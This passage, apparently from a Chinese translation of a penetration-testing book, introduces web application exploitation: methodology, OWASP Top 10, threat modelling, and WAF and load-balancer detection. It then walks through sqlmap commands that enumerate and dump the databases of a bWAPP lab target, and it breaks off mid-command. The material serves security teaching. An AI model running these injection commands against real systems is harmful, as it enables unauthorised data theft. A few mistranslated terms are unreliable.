  \n![](img/fm1.png)\n\n# 第 6 章：利用 Web 应用程序\n\n## 引言\n\n本章的主要目标是对 Web 应用程序利用提供全面的介绍。在当今数字时代，Web\
  \ 应用已成为个人、企业和组织日常运营不可或缺的一部分，但它们也容易受到网络攻击。因此，Web 应用审计员和渗透测试人员彻底理解 Web 漏洞以及如何利用它们至关重要。\n\
  \n本章涵盖了 Web 应用的基础和高级级漏洞利用。它解释了网络攻击者使用的常用攻击向量，并教你如何根据业务的性质和类别创建威胁模型，以进行高效的测试。此外，你将学习识别并利用\
  \ Web 应用中所有的技术和业务逻辑流，以及如何将较小的漏洞链联以更好地理解其影响。在本章结束时，你将完全理解最先进的 Web 应用利用技术。你将具备进行复杂评估所需的知识。\n\
  \n## 结构\n\n在本章中，我们将讨论以下主题：\n\n*   什么是 Web 应用渗透测试\n    *   Web 应用渗透测试方法\n    *  \
  \ Web 应用渗透测试攻击向量\n    *   Web 应用的 OWASP Top 10\n*   Web 应用渗透测试威胁建模\n*   Web 应用渗透测试思维导图\n\
  *   检测 Web 应用防火墙和负载均衡器\n*   利用特定应用程序漏洞\n    *   SQL 注入\n    *   PHP 代码执行\n    *\
  \   登录暴力破解\n    *   身份验证失效\n    *   不安全的直接对象引用 (IDOR)\n    *   使用 `XSS` 验证器进行 `XSS`\n\
  \    *   通过无限制文件上传和 HTTP 参数污染利用后门\n*   业务逻辑缺陷\n\n## 目标\n\n本章全面介绍了 Web 应用程序利用，并充分考虑了它们在日常运营中的重要性和脆弱性。它涵盖了基础和高级漏洞利用，教授自定义威胁模型，并强调了常见的攻击向量。读者将学习识别和利用技术及业务逻辑漏洞，获得评估其整体影响的洞察。本章为读者提供了高级\
  \ Web 应用利用技能，用于进行复杂的评估和增强网络安全。\n\n## 什么是 Web 应用渗透测试\n\nWeb 应用渗透测试是确保 Web 应用安全的关键过程，通过识别可能被攻击者利用的漏洞。这一过程涉及进行各种测试，以检测可能导致未经授权访问或对应用程序及其用户造成损害的安全缺陷。注入攻击、跨站脚本\
  \ (`XSS`)、跨站请求伪造 (`CSRF`)、身份验证和授权漏洞、信息泄露、文件包含漏洞、不安全通信、拒绝服务 (`DoS`) 攻击和弱加密是 Web 应用渗透测试期间通常涵盖的最常见攻击向量。然而，具体的测试将取决于测试目标和所检查\
  \ Web 应用的特征。\n\n## Web 应用渗透测试方法\n\n要执行高级 Web 应用渗透测试，需要一种全面且有方法的方法来检测潜在漏洞并为增强 Web\
  \ 应用的安全提供建议。遵循标准化的方法对于确保所有可能的漏洞被识别和解决至关重要。高级 Web 应用渗透测试通常分以下阶段进行，下方的`图 6.1` 所示：\n\
  \n*   规划与侦察\n*   威胁建模与风险评估\n*   漏洞扫描\n*   手动测试\n*   漏洞利用与概念证明 (`POC`) 开发\n*   报告\n\
  \n![](img/Figure_6.1.png)\n\n图 6.1：Web 应用渗透测试方法\n\n| 注意：Web 应用渗透测试是 Web 应用安全的重要组成部分，有助于识别漏洞并加强\
  \ Web 应用的安全态势。 |\n\n## Web 应用渗透测试攻击向量\n\nWeb 应用渗透测试涉及检查一系列攻击向量，以检测可能被恶意活动者利用的漏洞。Web\
  \ 应用渗透测试中审查的最常见攻击向量如下：\n\n*   注入攻击\n*   跨站脚本\n*   跨站请求伪造\n*   身份验证和授权漏洞\n*   信息泄露\n\
  *   文件包含漏洞\n*   不安全通信\n*   拒绝服务攻击\n*   弱加密\n*   访问控制失效\n*   配置错误\n*   业务逻辑缺陷\n*\
  \   社会工程\n\n## Web 应用的 OWASP Top 10\n\nOWASP Top 10 是 Web 应用最严重安全风险的汇编，由开放 Web 安全项目\
  \ (`OWASP`) 定期识别和更新。它为 Web 应用可能遇到的最重要漏洞提供了宝贵的指导。2021 年版的 Web 应用 OWASP Top 10 包含以下漏洞：\n\
  \n*   访问控制失效\n*   加密失败\n*   注入\n*   不安全设计\n*   安全配置错误\n*   漏洞和过时的组件\n*   身份和认证失效\n\
  *   软件和数据完整性失败\n*   安全日志和监控失败\n*   服务器端请求伪造 (SSRF)\n\n## Web 应用渗透测试威胁建模\n\n威胁建模是一个系统评估和分析系统或应用程序相关风险的过程，以便开发适当的缓解策略，帮助降低网络攻击的可能性和影响。在进行\
  \ Web 应用渗透测试时，威胁建模可以帮助安全专业人员确定潜在漏洞的优先级并指导他们的测试工作。在 Web 应用渗透测试的背景下执行威胁建模时可以采取以下步骤：\n\
  \n*   识别资产\n*   定义架构\n*   识别潜在威胁\n*   分析风险\n*   威胁排序\n*   制定缓解策略\n*   测试 Web 应用\n\
  \n让我们考虑一个 Web 电子商务应用程序示例，它允许用户浏览产品、将商品添加到购物车并完成购买。以下是威胁建模过程如何应用于此应用程序：\n\n1.  识别资产：电子商务应用程序依赖于几项资产，包括用户数据（如个人身份信息、订单历史和支付详情）、应用程序服务器和网络基础设施。\n\
  \n\n\n\n\n## 2. 定义架构\n该电子商务应用程序由前端 Web 服务器、处理用户请求的应用程序服务器、负载均衡器、中间件、微服务以及存储用户数据的后端数据库组成。\n\
  \n## 3. 识别潜在威胁\n电子商务应用程序可能面临各种威胁，例如 SQL 注入攻击、不当的访问控制以及敏感数据泄露。\n\n## 4. 分析风险\nSQL\
  \ 注入攻击可能导致对数据库的未经授权访问，而不当的访问控制可能导致用户数据被未经授权修改。敏感数据的泄露可能导致用户信息被盗。\n\n## 5. 确定威胁优先级\n\
  根据潜在风险和影响，对电子商务应用程序最严重的威胁可能包括 SQL 注入攻击、不当的访问控制和敏感数据泄露。\n\n## 6. 开发缓解策略\n为了应对这些威胁，电子商务应用程序可以实施措施，例如使用预处理语句防止\
  \ SQL 注入、设置适当的访问控制以防止用户数据被未经授权修改，以及加密敏感数据以防止泄露。\n\n## 7. 测试 Web 应用\n最后，必须使用合适的工具和技术对电子商务应用程序进行测试，以验证缓解策略的有效性并发现任何额外的漏洞。\n\
  \n> **注意：** 威胁建模是全面的 Web 渗透测试的关键组成部分，因为它有助于识别其他可能被忽略的漏洞。它帮助渗透测试人员制定针对性的计划来降低风险并提高应用程序的整体安全性。\n\
  \n## Web 应用渗透测试思维导图\nWeb 应用渗透测试思维导图可视化地表示了应用程序的结构以及待测试漏洞组件。它组织了测试过程，并使用思维导图软件、白板或纸张创建。地图包含了输入验证和会话管理等区域的节点，以及漏洞扫描和手动测试等特定测试活动的子节点。它有助于确保测试过程的全面性，并便于向客户沟通测试策略，如图\
  \ 6.2 所示：\n\n![](img/Figure_6.2.png)\n\n图 6.2: Web 应用渗透测试思维导图\n\n图 6.2 所示的“客户端（Client-side）”和“服务端”术语代表了应用程序架构的两个关键支柱。让我们深入研究这些组件的本质。\n\
  \n### 客户端\n当你使用应用程序时，负责界面美化并让你进行交互的部分被称为`客户端`。它运行在你的电脑或手机上，使用 `HTML`、`CSS` 和 `JavaScript`\
  \ 等工具向你显示按钮、图片，并在你点击时做出响应。\n\n### 服务端\n想象你正在应用中提一个问题。`服务端`就像一个坐在远处的得助手。它接收你的问题，弄清楚你需要什么，与数据库通信，并传回有用的答案。它负责诸如安全、数据管理和确保运行顺畅等智能化的工作。\n\
  \n在表 6.1 中，让我们了解`客户端`和`服务端`如何在应用程序架构中协同工作：\n\n| 方面 | 客户端 | 服务端 |\n| :--- | :---\
  \ | :--- |\n| 角色 | 创建吸引人的视觉效果，使用 `HTML`、`CSS` 和 `JavaScript` 实现交互。 | 充远处的助手，处理你的请求，与数据库通信并提供价值价值响应。管理安全、数据和无缝运行。\
  \ |\n| 运行位置 | 运行在你的电脑或手机上。 | 运行在远程服务器上。 |\n| 性能 | 确保设备上视觉效果流畅、快速。 | 处理复杂任务以实现无缝性能，特别是对于错综的操作。\
  \ |\n| 安全性 | 直接交互 | 像安全员一样保护你的数据和应用。 |\n| 数据处理 | 显示图像，响应点击。 | 理解你的需求，管理数据并交付有意义的响应。\
  \ |\n\n表 6.1: 服务端与客户端的协同作用\n\n## 检测 Web 应用防火墙和负载均衡器\n收集目标应用程序的完整准确信息至关重要。如果应用程序部署包含了\
  \ Web 应用防火墙（`WAF`）和负载均衡器（`LB`），它们可能会影响应用程序服务器负载和响应。对攻击和响应的任何疑惑或误解都可能导致漏洞无法识别或风险计算错误。\n\
  \n要识别 Web 应用上是否部署了 `WAF`，可以使用 `wafw00f <webapplication URL>` 命令，如下面的图 6.3 所示：\n\n\
  ![](img/Figure_6.3.png)\n\n图 6.3: Web 应用防火墙检测\n\n要识别 Web 应用上是否部署了 `LB`，可以使用 `lbd\
  \ <webapplication URL>` 命令，如下面的图 6.4 所示：\n\n![](img/Figure_6.4.png)\n\n图 6.4: 负载均衡器检测\n\
  \n## 利用特定应用程序漏洞\n让我们探索 Web 应用中常见的某些特定漏洞。这些漏洞可能包括应用程序逻辑中的缺陷、配置问题或代码中的弱点。\n\n### SQL\
  \ 注入\nSQL 注入是 Web 应用中发现的一种危险漏洞，渗透测试人员可以利用通过输入字段注入恶意的 `SQL` 语句。这种漏洞可能导致严重后果，例如敏感信息的未经授权泄露，包括个人数据、密码或财务记录。渗透测试人员可以使用此弱点获取敏感信息、修改数据，甚至完全控制\
  \ Web 应用程序。\n\n渗透测试人员应该注意 SQL 注入攻击的几种主要类型：\n\n*   **带内 SQL 注入 (In-band SQL injection)：**\
  \ 带内 注入允许渗透测试人员通过同一通道发送和接收攻击结果。它是非盲的，对 Web 应用的安全构成重大风险。\n*   **盲 SQL 注入 (Blind SQL\
  \ injection)：** 盲 SQL 注入更难检测，因为渗透测试人员无法接收直接的数据库信息，而是从响应中解释线索。\n*   **带外 SQL 注入 (Out-of-band\
  \ SQL injection)：** 带外 SQL 注入使用独立的通信通道来发送和接收攻击结果，例如使用 `DNS` 查询。\n\n渗透测试人员应该了解主要的\
  \ SQL 注入攻击类型，但攻击者可以使用许多变体和组合来利用漏洞。保持对最新技术的更新至关重要。\n\n为了理解在实践中如何利用 SQL 注入，我们将使用一个\
  \ Buggy Web Application (`bWAPP`) 的单个通用可扩展模板 (`GET`) 参数的示例，并在尝试使用 `sqlmap` 利用它之前识别其\
  \ SQL 漏洞。`sqlmap` 是一种广泛使用的开源渗透测试工具，简化了 Web 应用中 SQL 注入漏洞的检测和利用。以下是使用 `sqlmap` 在 bWAPP\
  \ (GET/search) 页面中利用 SQL 注入的步骤方法：\n\n1.  确定 bWAPP (GET/search) 页面的目标 URL 以测试 SQL\
  \ 注入漏洞，如图 6.5 所示：\n\n    ![](img/Figure_6.5.png)\n\n    图 6.5: 用于测试 SQL 注入的 BWAPP\
  \ (GET/search) 页面\n\n2.  使用命令 `sqlmap -u <target URL> --random-agent` 检测目标 URL 中的\
  \ SQL 注入漏洞，如图 6.6 所示：\n\n    ```\n    sqlmap -u http://192.168.29.25/bWAPP/sqli_1.php?title=\
  \ --cookie=\"PHPSESSID=q8omhem3kkoi09sfnfo9ukim22;security_level=0\" --random-agent\n\
  \    ```\n\n    ![](img/Figure_6.6.png)\n\n    图 6.6: 检测 SQL 注入漏洞\n\n\n\n\n###3.\
  \ 使用上述命令针对识别出的漏洞参数列出所有可能的 SQL 注入类型，如图 6.7 所示：\n\n![](img/Figure_6.7.png)\n\n图 6.7:\
  \ 所有可能的 SQL 注入类型列表\n\n4. 分析目标 URL 的 SQL 注入漏洞，并使用图 6.8 所示的命令 `sqlmap -u <target URL>\
  \ --random-agent --dbs` 生成可用数据库列表：\n\n命令：`sqlmap -u http://192.168.29.25/bWAPP/sqli_1.php?title=\
  \ --cookie=\"PHPSESSID=q8omhem3kkoi09sfnfo9ukim22;security_level=0\" --random-agent\
  \ –dbs`\n\n![](img/Figure_6.8.png)\n\n图 6.8: 可用数据库列表\n\n5. 在获取数据库列表后，运行命令 `sqlmap\
  \ -u <target URL> --random-agent -D <database name> --tables`，如图 6.9 所示显示所选数据库中的所有表：\n\
  \n命令：`sqlmap -u http://192.168.29.25/bWAPP/sqli_1.php?title= --cookie=\"PHPSESSID=q8omhem3kkoi09sfnfo9ukim22;security_level=0\"\
  \ --random-agent –D bwapp –tables`\n\n![](img/Figure_6.9.png)\n\n图 6.9: bWAPP 数据库中的可用表列表\n\
  \n6. 通过运行命令 `sqlmap -u <target URL> --random-agent -D <database name> --dump`，如图\
  \ 6.10 所示从目标表或整个数据库检索数据，`sqlmap` 将从目标数据库检索所有数据并显示在终端窗口中。\n\n命令：`sqlmap -u http://192.168.29.25/bWAPP/sqli_1.php?title=\
  \ --cookie=\"PHPSESSID=q8omhem3kkoi09sfnfo9ukim22;security_level=0\" --random-agent\
  \ –D bwapp --dump`\n\n![](img/Figure_6.10.png)\n\n图 6.10: 从目标数据库导出的数据\n\n7. 使用图\
  \ 6.11 所示的命令 `sqlmap -u <target URL> --random-agent --is-dba` 验证当前用户账户是否对目标数据库具有管理员或数据库管理员\
  \ (DBA)权限：\n\n命令：`sqlmap -u http://192.168.29.25/bWAPP/sqli_1.php?title= --cookie=\"\
